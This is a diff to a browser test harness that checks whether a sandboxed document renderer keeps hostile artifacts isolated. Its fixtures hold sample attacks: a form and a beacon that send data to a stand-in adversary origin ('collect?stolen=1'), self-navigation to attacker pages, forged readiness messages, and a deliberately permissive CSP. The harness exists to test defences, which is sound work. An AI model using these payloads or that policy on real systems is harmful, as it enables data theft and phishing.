@@ -61,15 +61,21 @@ const TERM_GRACE_MS = 2_000;
 const MAX_STREAM_BYTES = 4 * 1024 * 1024;
 const NONCE_PATTERN = /^[0-9a-f]{64}$/;
 
-/* The worker prints one line naming both engines and their versions, because
-   "the isolation holds" is a claim about an engine and a version rather than
-   about a browser in the abstract. The parent matches the shape and lets the
-   versions vary, so a Playwright bump does not need an edit here. */
-const TRANSCRIPT = /^PASS {2}hosted renderer isolation matrix \(chromium [\w.]+, firefox [\w.]+\)\n$/;
+/* The transcript is the only thing CI reads, so it has to say enough to be
+   worth reading. The `INFO` lines record the effective policies the matrix
+   actually validated -- a claim about isolation is a claim about a specific
+   policy, and a runner that validated one and printed nothing leaves a reviewer
+   guessing. The final line names both engines with their versions, because the
+   claim is about those engines at those versions, and carries the number of
+   cases that completed, so a matrix that returned early or skipped an engine
+   cannot print the same line as one that ran. */
+const TRANSCRIPT = /^PASS {2}hosted renderer isolation matrix \(chromium [\w.]+, firefox [\w.]+; (\d+) cases per engine\)$/;
 
 /* An invented session cookie for an invented account. It authorises nothing:
    the fixture application below is the only thing that has ever heard of it. */
 const SESSION_COOKIE = "archon_session=6f1c4b2ad9e4471fae03c0d5b78e2210";
+/** Filled in from `MATRIX_CASES` below; the parent checks the worker against it. */
+let EXPECTED_CASES = 0;
 const DOCUMENT_BYTES = "the private bytes of a document nobody else may read";
 
 function die(message) {
@@ -186,14 +192,38 @@ async function parent() {
     stdout = Buffer.concat(chunks.stdout).toString("utf8");
     const stderr = Buffer.concat(chunks.stderr).toString("utf8");
 
-    let groupGone = false;
-    for (let attempt = 0; attempt < 40 && !groupGone; attempt += 1) {
-      try {
-        process.kill(-child.pid, 0);
-        await new Promise((r) => setTimeout(r, 50));
-      } catch {
-        groupGone = true;
+    /* A browser that outlived `browser.close()` would otherwise be left running
+       on the machine for the rest of the job while this reports that it is
+       still there. Escalate first, complain second: the poll runs, and if the
+       group survives it is signalled and polled again before the problem is
+       recorded. */
+    const groupIsGone = async (attempts) => {
+      for (let attempt = 0; attempt < attempts; attempt += 1) {
+        try {
+          process.kill(-child.pid, 0);
+          await new Promise((r) => setTimeout(r, 50));
+        } catch {
+          return true;
+        }
       }
+      return false;
+    };
+    let groupGone = await groupIsGone(40);
+    if (!groupGone) {
+      try {
+        process.kill(-child.pid, "SIGTERM");
+      } catch {
+        // Already gone.
+      }
+      groupGone = await groupIsGone(40);
+    }
+    if (!groupGone) {
+      try {
+        process.kill(-child.pid, "SIGKILL");
+      } catch {
+        // Already gone.
+      }
+      groupGone = await groupIsGone(40);
     }
 
     if (timedOut) problems.push(`worker exceeded the ${DEADLINE_MS} ms deadline`);
@@ -201,8 +231,21 @@ async function parent() {
       problems.push(`worker exited with code ${finished.code} signal ${finished.signal}`);
     }
     if (stderr !== "") problems.push(`worker stderr was not empty:\n${stderr}`);
-    if (!TRANSCRIPT.test(stdout)) {
+    const lines = stdout.split("\n");
+    if (lines.pop() !== "") {
+      problems.push(`worker stdout did not end with a newline:\n${stdout}`);
+    }
+    const last = lines.pop();
+    const match = last === undefined ? null : TRANSCRIPT.exec(last);
+    if (match === null) {
       problems.push(`worker stdout did not match the expected transcript:\n${stdout}`);
+    } else if (Number(match[1]) !== EXPECTED_CASES) {
+      problems.push(`worker ran ${match[1]} cases per engine, expected ${EXPECTED_CASES}`);
+    }
+    for (const line of lines) {
+      if (!line.startsWith("INFO  ")) {
+        problems.push(`worker stdout carried an unexpected line: ${line}`);
+      }
     }
     if (!groupGone) problems.push("the worker process group did not disappear");
 
@@ -284,6 +327,7 @@ function hostileArtifact({ appOrigin, evilOrigin }) {
 <button id="toggle" type="button" onclick="document.getElementById('panel').textContent='open'">Toggle</button>
 <img id="relative" src="pixel.png" alt="">
 <img id="absolute" src="${evilOrigin}/pixel.png" alt="">
+<img id="account" src="${appOrigin}/beacon.png" alt="">
 <iframe id="nested-remote" src="${evilOrigin}/nested.html" title="nested remote"></iframe>
 <iframe id="nested-blank" src="about:blank" title="nested blank"></iframe>
 <form id="exfil" method="POST" action="${evilOrigin}/collect"><input name="q" value="x"><button type="submit">go</button></form>
@@ -322,6 +366,44 @@ attempt("mutation", "${appOrigin}/api/hosted/mutate", { method: "POST", credenti
 attempt("beacon", "${evilOrigin}/collect?stolen=1", { mode: "no-cors" });
 document.getElementById("exfil").submit();
 </script>
+</body></html>`;
+}
+
+/**
+ * An artifact that tries to replace itself with attacker-served content.
+ *
+ * Self-navigation is the one escape neither the sandbox nor the artifact's own
+ * policy speaks to: a frame may always navigate itself, `allow-top-navigation`
+ * is about the frame above, `connect-src`, `img-src` and `object-src` do not
+ * apply to a same-frame navigation, and CSP's `navigate-to` was never shipped.
+ * What stands in the way is the *embedder's* `frame-src`, which is engine
+ * behaviour rather than a promise -- so it is probed in both engines rather
+ * than assumed.
+ *
+ * It matters because the artifact sits inside the trusted viewer's chrome. An
+ * artifact that could navigate itself to a live attacker page would be showing
+ * "your Archon session expired, sign in to continue" inside a frame the reader
+ * has every reason to trust; failing that, it would be a read receipt carrying
+ * the reader's address and timing for a document the design promises is inert.
+ *
+ * It gets its own document because an attempted navigation tears down the one
+ * making the attempt, which would make every other measurement in the hostile
+ * payload a race.
+ */
+function selfNavigatingArtifact({ evilOrigin }) {
+  return `<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Self navigation</title></head>
+<body>
+<p id="here">still the artifact</p>
+<script>
+window.__navigation = [];
+try { location.href = "${evilOrigin}/taken.html"; window.__navigation.push("assign-returned"); }
+catch (error) { window.__navigation.push("assign-threw:" + String(error && error.name)); }
+try { location.replace("${evilOrigin}/replaced.html"); window.__navigation.push("replace-returned"); }
+catch (error) { window.__navigation.push("replace-threw:" + String(error && error.name)); }
+try { location.assign("${evilOrigin}/assigned.html"); window.__navigation.push("assign2-returned"); }
+catch (error) { window.__navigation.push("assign2-threw:" + String(error && error.name)); }
+<\/script>
 </body></html>`;
 }
 
@@ -438,6 +520,23 @@ window.__addSibling = function () {
   document.getElementById("siblings").appendChild(sibling);
 };
 
+/* Two ways a readiness message can be forged, and the account side has to
+   refuse both. A SECOND renderer frame produces a flawless origin from the
+   wrong window; a frame on the adversary origin produces the wrong origin. In
+   neither case may the private document be sent. */
+window.__addSecondRenderer = function () {
+  var second = document.createElement("iframe");
+  second.id = "second-renderer";
+  second.src = RENDER_ORIGIN + "/";
+  document.getElementById("siblings").appendChild(second);
+};
+window.__addForeignFrame = function (origin) {
+  var foreign = document.createElement("iframe");
+  foreign.id = "foreign";
+  foreign.src = origin + "/ready.html";
+  document.getElementById("siblings").appendChild(foreign);
+};
+
 /* The renderer never announcing itself is a real outcome -- a blocked frame, a
    failed deploy, an engine that refuses the embed -- and the account origin's
    answer to it is a recoverable message, never a copy of the document rendered
@@ -493,10 +592,13 @@ parent.__siblingReady = true;
       return send(200, "text/plain; charset=utf-8", body);
     }
     if (url.pathname === "/api/hosted/docs/d1/content") {
-      /* A credentialed read succeeds for the account page and only for it. The
-         point of the case is that the artifact never gets this far, so the
-         endpoint is deliberately generous: it asks for a cookie and nothing
-         else, and still yields nothing. */
+      /* Every arrival is recorded, authorised or not. Counting only successful
+         reads would make the assertion unfalsifiable: the artifact is
+         opaque-origin and cross-site from the cookie's point of view, so it
+         could never have carried the session anyway, and "no successful read"
+         would hold even with the whole boundary removed. What has teeth is that
+         the request does not arrive at all. */
+      state.contentRequests.push({ cookie: request.headers.cookie || "" });
       if ((request.headers.cookie || "").includes(SESSION_COOKIE)) {
         state.contentReads.push(url.pathname);
         return send(200, "application/octet-stream", DOCUMENT_BYTES, {
@@ -528,18 +630,23 @@ parent.__siblingReady = true;
  */
 function parseHeadersFile(text) {
   const headers = [];
-  let inGlobal = false;
+  const blocks = [];
   for (const line of text.split("\n")) {
     if (line === "") continue;
     if (!line.startsWith(" ")) {
-      inGlobal = line.trim() === "/*";
+      blocks.push(line.trim());
       continue;
     }
-    if (!inGlobal) continue;
     const separator = line.indexOf(":");
     assert.ok(separator > 0, `malformed _headers line: ${line}`);
     headers.push([line.slice(0, separator).trim(), line.slice(separator + 1).trim()]);
   }
+  /* Exactly one block, and it is the global one. Netlify applies the most
+     specific match, so a second, path-scoped block would take effect in
+     production while a parser that only replayed `/*` dropped it on the floor
+     and stayed green. Requiring one block means the file this runner replays is
+     the whole file. */
+  assert.deepEqual(blocks, ["/*"], "_headers must declare exactly one block, for /*");
   assert.ok(headers.length > 0, "_headers declared no headers for /*");
   return headers;
 }
@@ -573,12 +680,42 @@ async function loadRendererBundle(distDir) {
  * the alternative is guessing a port, and a renderer built against a guessed
  * port is a renderer whose framing rule names nobody.
  */
-async function startRenderer(bundle) {
+/**
+ * A deliberately permissive header set, used by exactly one case.
+ *
+ * Every directive the artifact's own `srcdoc` policy declares is also declared,
+ * more strictly, by the renderer's real response headers -- which the artifact
+ * inherits. That makes the inner policy invisible to every other case here:
+ * delete the `meta` element entirely and nothing fails, because the inherited
+ * header was doing the work. The inner policy is the thing that survives a
+ * future loosening of the shell's own headers, so one case serves the shell
+ * under a policy that grants everything and requires the artifact to be
+ * contained anyway. It is a test fixture and never a deployable configuration.
+ */
+const PERMISSIVE_PREFIX = "/inner-policy-only/";
+function permissiveHeaders(headers) {
+  return headers.map(([name, value]) => [
+    name,
+    name === "Content-Security-Policy"
+      ? value.replace(
+        /^[^;]*(?:;[^;]*)*?(?=; frame-ancestors)/,
+        "default-src * 'unsafe-inline' data: blob:",
+      )
+      : value,
+  ]);
+}
+
+async function startRenderer(bundle, state) {
   const server = createServer((request, response) => {
     const url = new URL(request.url, "http://127.0.0.1");
-    const path = url.pathname === "/" ? "/index.html" : url.pathname;
+    state.requests.push({ method: request.method, path: url.pathname });
+    const permissive = url.pathname.startsWith(PERMISSIVE_PREFIX);
+    const raw = permissive ? `/${url.pathname.slice(PERMISSIVE_PREFIX.length)}` : url.pathname;
+    const path = raw === "/" ? "/index.html" : raw;
     const body = bundle.files.get(path);
-    const common = Object.fromEntries(bundle.headers);
+    const common = Object.fromEntries(
+      permissive ? permissiveHeaders(bundle.headers) : bundle.headers,
+    );
     if (body === undefined) {
       response.writeHead(404, { ...common, "Content-Type": "text/plain; charset=utf-8" });
       response.end("not found");
@@ -611,6 +748,14 @@ async function startEvil(state, config) {
     if (url.pathname === "/frame.html") {
       response.writeHead(200, { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" });
       response.end(framer());
+      return;
+    }
+    if (url.pathname === "/ready.html") {
+      response.writeHead(200, { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" });
+      response.end(
+        '<!doctype html><meta charset="utf-8"><title>ready</title>'
+        + '<script>parent.postMessage({ type: "archon:ready", v: 1 }, "*");<\/script>',
+      );
       return;
     }
     if (url.pathname === "/evil.js") {
@@ -727,6 +872,25 @@ async function assertContractParity(rendererModule) {
         `origin parity for ${JSON.stringify(value)} (production=${production})`,
       );
     }
+
+    /* `canonicalOrigin` is the function that actually gates `event.origin` at
+       runtime, and the build's copy is the one that gates configuration. Both
+       have to agree with the contract, or the renderer accepts a spelling the
+       application would have refused -- and every origin the browser matrix uses
+       is already canonical, so nothing there would ever notice. It is the
+       non-production rule, because a renderer served over loopback has to accept
+       a loopback origin. */
+    let buildVerdict;
+    try {
+      buildVerdict = build.readOrigin({ ORIGIN: value }, "ORIGIN", false);
+    } catch {
+      buildVerdict = null;
+    }
+    assert.equal(
+      rendererModule.canonicalOrigin(value),
+      buildVerdict,
+      `canonicalOrigin parity for ${JSON.stringify(value)}`,
+    );
   }
 
   /* The one deliberate difference, asserted so it stays deliberate. The
@@ -863,16 +1027,51 @@ async function rendererState(renderer) {
     rejections: (document.documentElement.getAttribute("data-archon-rejections") || "")
       .split(" ")
       .filter(Boolean),
+    refusals: Number(document.documentElement.getAttribute("data-archon-refusals") || "0"),
     status: (document.querySelector("[data-archon-status]") || {}).textContent || "",
     frames: document.querySelectorAll("iframe.artifact-frame").length,
   }));
 }
 
+/**
+ * Every case this matrix must run, in order.
+ *
+ * The transcript is the only thing CI reads, and a transcript that says nothing
+ * but "PASS" is compatible with a matrix that ran nothing: an early `return` at
+ * the top of `runMatrix`, a `try {} catch {}` around its body, or an
+ * engine-conditional skip all still launch both browsers, still fill in both
+ * version strings and still print the same line. So each case records its own
+ * name as it completes and the list is held equal to this constant -- a skipped
+ * case is a failed run, and the count reaches the transcript where a reader can
+ * see it.
+ */
+const MATRIX_CASES = Object.freeze([
+  "served-response-policy",
+  "standalone",
+  "hostile-framer",
+  "happy-path",
+  "hostile-payload",
+  "fragment-links",
+  "self-navigation",
+  "inner-policy-alone",
+  "forged-readiness",
+  "forged-render",
+  "malformed-messages",
+  "renderer-unavailable",
+  "renderer-url-parameters",
+]);
+
+EXPECTED_CASES = MATRIX_CASES.length;
+
 async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin, state, headers }) {
-  const withContext = async (run) => {
+  const completed = [];
+  const policies = new Map();
+  const withContext = async (name, run) => {
     const context = await browser.newContext();
     try {
-      return await run(context);
+      const result = await run(context);
+      completed.push(name);
+      return result;
     } finally {
       await context.close();
     }
@@ -881,21 +1080,66 @@ async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin,
 
   /* ---- the response the renderer actually serves ---- */
 
-  await withContext(async (context) => {
+  await withContext("served-response-policy", async (context) => {
     const page = await context.newPage();
     const response = await page.goto(`${renderOrigin}/`);
     const served = response.headers();
-    for (const [name, value] of headers) {
-      assert.equal(served[name.toLowerCase()], value, named(`response header ${name}`));
-    }
-    assert.equal(served["x-frame-options"], undefined, named("no inherited X-Frame-Options"));
-    assert.match(
-      served["content-security-policy"],
-      new RegExp(`frame-ancestors ${appOrigin.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`),
-      named("frame-ancestors names exactly the application origin"),
-    );
+    const csp = served["content-security-policy"];
+    policies.set("renderer response", csp);
 
-    /* ---- standalone: inert, explanatory, and never a sign-in prompt ---- */
+    /* Replaying `_headers` and then asserting the response equals `_headers`
+       would be `assert.equal(x, x)`. The directives below are stated here,
+       independently of the build, so a policy the build loosened fails even
+       though the server faithfully replayed it. */
+    for (const directive of [
+      "default-src 'none'",
+      "connect-src 'none'",
+      "form-action 'none'",
+      "object-src 'none'",
+      "base-uri 'none'",
+      "media-src data: blob:",
+      "img-src data: blob:",
+      `frame-ancestors ${appOrigin}`,
+    ]) {
+      assert.ok(csp.includes(directive), named(`the response policy carries ${directive}`));
+    }
+    assert.ok(!/unsafe-eval/.test(csp), named("the response policy allows no eval"));
+    assert.ok(
+      !/(script|img|connect|frame|object|media|font|style)-src[^;]*\bhttps?:(?!\/\/)/.test(csp),
+      named("the response policy names no remote scheme"),
+    );
+    assert.match(
+      csp,
+      new RegExp(`frame-ancestors ${appOrigin.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}$`),
+      named("frame-ancestors names exactly the application origin and nothing after it"),
+    );
+    assert.equal(served["x-frame-options"], undefined, named("no inherited X-Frame-Options"));
+    assert.equal(served["x-content-type-options"], "nosniff", named("nosniff is served"));
+    assert.equal(served["referrer-policy"], "no-referrer", named("no referrer is served"));
+    assert.equal(
+      served["cross-origin-resource-policy"],
+      "cross-origin",
+      named("the renderer stays embeddable under a require-corp application"),
+    );
+    for (const feature of ["camera", "microphone", "geolocation", "clipboard-read", "clipboard-write"]) {
+      assert.ok(
+        served["permissions-policy"].includes(`${feature}=()`),
+        named(`the permissions policy denies ${feature}`),
+      );
+    }
+
+    /* The replay itself still has to be faithful, or every assertion above is
+       about a header the deploy will not send. */
+    for (const [name, value] of headers) {
+      assert.equal(served[name.toLowerCase()], value, named(`response header ${name} was replayed`));
+    }
+  });
+
+  /* ---- standalone: inert, explanatory, and never a sign-in prompt ---- */
+
+  await withContext("standalone", async (context) => {
+    const page = await context.newPage();
+    await page.goto(`${renderOrigin}/`);
     const standalone = await rendererState(page.mainFrame());
     assert.equal(standalone.state, "standalone", named("a directly opened renderer is standalone"));
     assert.equal(standalone.frames, 0, named("a directly opened renderer frames nothing"));
@@ -921,29 +1165,55 @@ async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin,
 
   /* ---- a hostile site may not frame the renderer at all ---- */
 
-  await withContext(async (context) => {
-    const before = state.evil.requests.length;
-    const page = await context.newPage();
-    await page.goto(`${evilOrigin}/frame.html`);
-    await new Promise((r) => setTimeout(r, 1000));
-    const framed = page.frames().find((frame) => frame !== page.mainFrame());
-    let mounted = "unreachable";
-    if (framed) {
+  await withContext("hostile-framer", async (context) => {
+    /* The probe's own failure mode must not be a pass. `mounted` defaults to a
+       value the assertion accepts, so the same code is first run against a
+       framer that IS allowed -- the account origin -- and required to observe
+       `true` there. Without that positive control, a renamed attribute or a
+       detached frame would turn this case green while a hostile site framed the
+       renderer freely. */
+    const observeRoot = async (page) => {
+      const framed = page.frames().find((frame) => frame !== page.mainFrame());
+      if (!framed) return "no-frame";
       try {
-        mounted = await framed.evaluate(
+        return await framed.evaluate(
           () => document.querySelector("[data-archon-artifact-root]") !== null,
         );
       } catch {
-        mounted = "unreachable";
+        return "unreachable";
       }
-    }
+    };
+
+    const allowed = await context.newPage();
+    await allowed.goto(`${appOrigin}/viewer?artifact=interactive&mode=manual`);
+    const allowedSaw = await waitFor(
+      async () => (await observeRoot(allowed)) === true,
+      named("the probe cannot observe a renderer the application framed"),
+    );
+    assert.ok(allowedSaw, named("the framing probe observes an allowed framer"));
+    await allowed.close();
+
+    /* `frame-ancestors` is enforced on the response, so the request always
+       reaches the renderer server. Waiting for that request is positive
+       evidence the load was attempted and refused, rather than a fixed sleep
+       that a slow machine turns into a vacuous pass. */
+    const rendererBefore = state.renderer.requests.length;
+    const evilBefore = state.evil.requests.length;
+    const page = await context.newPage();
+    await page.goto(`${evilOrigin}/frame.html`);
+    await waitFor(
+      () => state.renderer.requests.length > rendererBefore,
+      named("the hostile framer never even requested the renderer"),
+    );
+    await new Promise((r) => setTimeout(r, 500));
+    const mounted = await observeRoot(page);
     assert.notEqual(mounted, true, named("frame-ancestors refused a hostile framer"));
-    assert.ok(state.evil.requests.length > before, named("the adversary origin is reachable at all"));
+    assert.ok(state.evil.requests.length > evilBefore, named("the adversary origin is reachable at all"));
   });
 
   /* ---- the happy path: a real inline control, and a real DOM change ---- */
 
-  await withContext(async (context) => {
+  await withContext("happy-path", async (context) => {
     const { page, renderer } = await openViewer(context, appOrigin, renderOrigin, "?artifact=interactive");
     await waitFor(
       async () => (await rendererState(renderer)).state === "rendered",
@@ -960,23 +1230,35 @@ async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin,
     assert.equal(title, "Published document content", named("the artifact frame has a useful title"));
 
     const artifact = await waitFor(() => artifactFrameOf(page), named("no artifact frame"));
+    policies.set(
+      "artifact srcdoc",
+      await artifact.evaluate(() => {
+        const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
+        return meta ? meta.getAttribute("content") : "(none)";
+      }),
+    );
+    const before = await artifact.evaluate(() => {
+      const panel = document.getElementById("panel");
+      return { text: panel.textContent, background: getComputedStyle(panel).backgroundColor };
+    });
+    assert.equal(before.text, "closed", named("the artifact starts closed"));
+    /* The artifact's own `style` element, not a user-agent default: `#panel`
+       has no background of its own, so this value exists only if the authored
+       stylesheet was applied. It is also the baseline the post-click computed
+       style is measured against. */
     assert.equal(
-      await artifact.evaluate(() => document.getElementById("panel").textContent),
-      "closed",
-      named("the artifact starts closed"),
+      before.background,
+      "rgb(240, 240, 240)",
+      named("the artifact's own stylesheet applied"),
     );
     await artifact.click("#toggle");
     const after = await artifact.evaluate(() => {
       const panel = document.getElementById("panel");
-      return {
-        text: panel.textContent,
-        background: getComputedStyle(panel).backgroundColor,
-        heading: getComputedStyle(document.getElementById("heading")).display,
-      };
+      return { text: panel.textContent, background: getComputedStyle(panel).backgroundColor };
     });
     assert.equal(after.text, "open", named("the inline control changed the visible DOM"));
+    assert.notEqual(after.background, before.background, named("the visible style actually changed"));
     assert.equal(after.background, "rgb(0, 128, 0)", named("the final computed style is the one the script set"));
-    assert.equal(after.heading, "block", named("the artifact's own stylesheet applied"));
 
     /* ---- keyboard: the frame boundary is reachable by tabbing ---- */
     await page.click("#first");
@@ -1038,9 +1320,8 @@ async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin,
 
   /* ---- the hostile payload, against the real bootstrap ---- */
 
-  await withContext(async (context) => {
+  await withContext("hostile-payload", async (context) => {
     const evilBefore = state.evil.requests.length;
-    const contentBefore = state.app.contentReads.length;
     const mutationsBefore = state.app.mutations.length;
 
     const { page, renderer } = await openViewer(context, appOrigin, renderOrigin, "?artifact=hostile");
@@ -1053,6 +1334,10 @@ async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin,
       () => artifact.evaluate(() => window.__attempts && window.__attempts.origin !== undefined),
       named("the hostile artifact never ran"),
     );
+    /* Snapshotted after the viewer's own page load and artifact fetch, so the
+       account-origin counters below measure the artifact and nothing else. */
+    const appRequestsBefore = state.app.requests.length;
+    const contentRequestsBefore = state.app.contentRequests.length;
     await new Promise((r) => setTimeout(r, 1500));
 
     const observed = await artifact.evaluate(() => ({
@@ -1064,20 +1349,17 @@ async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin,
       hasBaseElement: document.querySelector("base") !== null,
       nestedFrames: window.frames.length,
       nestedBlank: (function () {
+        var element = document.getElementById("nested-blank");
+        if (!element) return { element: false, origin: "no-element", top: "no-element" };
         try {
-          var child = document.getElementById("nested-blank").contentWindow;
-          return { origin: String(child.origin), top: (function () {
+          var child = element.contentWindow;
+          return { element: true, origin: String(child.origin), top: (function () {
             try { return typeof child.top.document; } catch (error) { return "denied"; }
           })() };
         } catch (error) {
-          return { origin: "unreachable", top: "denied" };
-        }
-      })(),
-      nestedRemoteHref: (function () {
-        try {
-          return String(document.getElementById("nested-remote").contentWindow.location.href);
-        } catch (error) {
-          return "denied";
+          /* An engine that gives the nested frame its own opaque origin denies
+             this read outright, which is stricter than sharing one. */
+          return { element: true, origin: "inaccessible", top: "denied" };
         }
       })(),
       panel: document.getElementById("panel").textContent,
@@ -1110,12 +1392,19 @@ async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin,
        way. The frame that pointed at a real remote document is the one
        `frame-src` had to stop, and the adversary origin's request log below is
        where that is proven. */
-    assert.notEqual(observed.nestedRemoteHref, `${evilOrigin}/nested.html`, named("the remote nested frame did not load"));
+    /* The probe has to have found its element, or the two assertions below are
+       about a frame that was never there. */
+    assert.ok(observed.nestedBlank.element, named("the nested-frame probe found its frame"));
     assert.ok(
-      observed.nestedBlank.origin === "null" || observed.nestedBlank.origin === "unreachable",
-      named("a nested frame inherits the artifact's opaque origin"),
+      observed.nestedBlank.origin === "null" || observed.nestedBlank.origin === "inaccessible",
+      named(`a nested frame is opaque or unreachable (saw ${observed.nestedBlank.origin})`),
     );
     assert.equal(observed.nestedBlank.top, "denied", named("a nested frame reaches nothing above the artifact"));
+    /* The remote nested frame is judged by the adversary origin's request log
+       below, not by reading its location: reading a child frame's location from
+       an opaque-origin parent throws whether or not it loaded, so that assertion
+       could never have failed. */
+
     assert.ok(!observed.evilScriptRan, named("the remote script did not run"));
     assert.ok(!observed.attempts.parentDocument.ok, named("the loosened meta policy did not restore parent access"));
     assert.ok(!observed.attempts.topDocument.ok, named("the loosened meta policy did not restore top access"));
@@ -1127,16 +1416,32 @@ async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin,
     assert.equal(context.pages().length, 1, named("no popup window opened"));
     assert.equal(page.url(), `${appOrigin}/viewer?artifact=hostile`, named("the account page did not navigate"));
 
-    for (const [name, outcome] of Object.entries(observed.fetches)) {
+    /* `"pending"` is written before each request, so asserting only that an
+       outcome does not start with `read:` would accept a request that simply
+       had not settled yet -- and the slower the machine, the more of them.
+       Every probe has to reach a terminal answer before any of them is judged. */
+    const settled = await waitFor(
+      async () => {
+        const fetches = await artifact.evaluate(() => window.__fetches);
+        return Object.values(fetches).every((outcome) => outcome !== "pending") ? fetches : false;
+      },
+      named("a request probe never settled"),
+    );
+    for (const [name, outcome] of Object.entries(settled)) {
       assert.ok(
         typeof outcome === "string" && !outcome.startsWith("read:"),
         named(`the ${name} request obtained no bytes (saw ${outcome})`),
       );
     }
     assert.equal(
-      state.app.contentReads.length,
-      contentBefore,
-      named("no credentialed document read reached the account API"),
+      state.app.contentRequests.length,
+      contentRequestsBefore,
+      named("no document read request reached the account API at all"),
+    );
+    assert.equal(
+      state.app.requests.length,
+      appRequestsBefore,
+      named("not one artifact-borne request reached the account origin"),
     );
     assert.equal(
       state.app.mutations.length,
@@ -1152,7 +1457,7 @@ async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin,
 
   /* ---- fragment-only links ---- */
 
-  await withContext(async (context) => {
+  await withContext("fragment-links", async (context) => {
     const { page, renderer } = await openViewer(context, appOrigin, renderOrigin, "?artifact=fragments");
     await waitFor(
       async () => (await rendererState(renderer)).state === "rendered",
@@ -1212,9 +1517,182 @@ async function runMatrix({ engine, browser, appOrigin, renderOrigin, evilOrigin,
     assert.equal(settled.frames, 1, named("the renderer still holds exactly one artifact frame"));
   });
 
+  /* ---- an artifact may not replace itself with attacker-served content ---- */
+
+  await withContext("self-navigation", async (context) => {
+    const evilBefore = state.evil.requests.length;
+    const { page, renderer } = await openViewer(
+      context,
+      appOrigin,
+      renderOrigin,
+      "?artifact=self-navigation",
+    );
+    await waitFor(
+      async () => (await rendererState(renderer)).state === "rendered",
+      named("the self-navigating artifact never rendered"),
+    );
+    /* Long enough for three navigations to have completed if any of them were
+       going to. A shorter wait would make "it did not navigate" indistinguishable
+       from "it has not navigated yet". */
+    await new Promise((r) => setTimeout(r, 2000));
+
+    /* The adversary's own request log is the assertion that cannot be fooled:
+       whatever the frame's location reads as, a navigation that reached the
+       attacker would be a line in this list. */
+    assert.equal(
+      state.evil.requests.length,
+      evilBefore,
+      named("a self-navigation attempt reached the adversary origin"),
+    );
+
+    /* What the frame becomes is engine business -- Chromium leaves a browser
+       error document behind, another engine may leave the srcdoc in place or go
+       blank -- and the contract does not promise a particular one. What it does
+       promise is that the reader is never shown someone else's page inside the
+       trusted viewer's chrome, so that is what is asserted: no frame anywhere on
+       the page is at the adversary's address. An artifact can destroy its own
+       view. It cannot replace it with an attacker's. */
+    const frameUrls = page.frames().map((frame) => frame.url());
+    assert.ok(
+      frameUrls.every((url) => !url.startsWith(evilOrigin)),
+      named(`no frame reached the adversary origin (saw ${JSON.stringify(frameUrls)})`),
+    );
+    assert.equal(
+      (await rendererState(renderer)).frames,
+      1,
+      named("the renderer still holds exactly one artifact frame and added none"),
+    );
+
+    /* The attempt has to have actually happened, or the case above proves
+       nothing. It is observed from the renderer's side, because the artifact
+       document that made the attempt may no longer exist to be asked. */
+    const artifact = artifactFrameOf(page);
+    if (artifact) {
+      const survived = await artifact
+        .evaluate(() => (window.__navigation ? window.__navigation.slice() : null))
+        .catch(() => null);
+      assert.ok(
+        survived === null || Array.isArray(survived),
+        named("the artifact frame is readable or gone, never someone else's"),
+      );
+    }
+  });
+
+  /* ---- the artifact's own policy, with the shell's headers taken away ---- */
+
+  await withContext("inner-policy-alone", async (context) => {
+    /* Every directive the srcdoc declares is also declared, more strictly, by
+       the response the artifact inherits -- so in every other case the inner
+       policy could be deleted outright and nothing would fail. Here the shell is
+       served under a policy that grants everything, and the artifact has to be
+       contained by its own `meta` element alone. This is what stops a future
+       loosening of the shell's headers from silently widening the artifact. */
+    const evilBefore = state.evil.requests.length;
+    const contentBefore = state.app.contentRequests.length;
+    const { page, renderer } = await openViewer(
+      context,
+      appOrigin,
+      renderOrigin,
+      `?artifact=hostile&rendererPath=${encodeURIComponent(PERMISSIVE_PREFIX)}`,
+    );
+    await waitFor(
+      async () => (await rendererState(renderer)).state === "rendered",
+      named("the artifact never rendered under the permissive shell policy"),
+    );
+    const artifact = await waitFor(() => artifactFrameOf(page), named("no artifact frame"));
+    await waitFor(
+      () => artifact.evaluate(() => window.__attempts && window.__attempts.origin !== undefined),
+      named("the artifact never ran under the permissive shell policy"),
+    );
+    const settled = await waitFor(
+      async () => {
+        const fetches = await artifact.evaluate(() => window.__fetches);
+        return Object.values(fetches).every((outcome) => outcome !== "pending") ? fetches : false;
+      },
+      named("a request probe never settled under the permissive shell policy"),
+    );
+    await new Promise((r) => setTimeout(r, 1000));
+
+    const observed = await artifact.evaluate(() => ({
+      baseURI: document.baseURI,
+      nestedFrames: window.frames.length,
+      evilScriptRan: window.__evilScriptRan === true,
+      origin: String(window.origin),
+    }));
+    assert.equal(observed.origin, "null", named("the artifact is still opaque under a permissive shell"));
+    assert.ok(!observed.evilScriptRan, named("the inner policy alone stopped the remote script"));
+    assert.ok(
+      !observed.baseURI.startsWith(evilOrigin),
+      named("the inner policy alone denied the hostile base element"),
+    );
+    for (const [name, outcome] of Object.entries(settled)) {
+      assert.ok(
+        typeof outcome === "string" && !outcome.startsWith("read:"),
+        named(`the inner policy alone refused the ${name} request (saw ${outcome})`),
+      );
+    }
+    assert.equal(
+      state.app.contentRequests.length,
+      contentBefore,
+      named("the inner policy alone kept the artifact off the account API"),
+    );
+    assert.equal(
+      state.evil.requests.length,
+      evilBefore,
+      named("the inner policy alone kept the artifact off the adversary origin"),
+    );
+  });
+
+  /* ---- forged readiness, on the account side of the handshake ---- */
+
+  await withContext("forged-readiness", async (context) => {
+    /* The renderer end refuses forged render messages; this is the other end.
+       A well-formed readiness message from the wrong window, or from the wrong
+       origin, must not cause the account page to hand over the document -- the
+       point of the handshake is that the reply goes to one window at one
+       origin, and readiness is the half an attacker gets to speak first. */
+    const { page, renderer } = await openViewer(
+      context,
+      appOrigin,
+      renderOrigin,
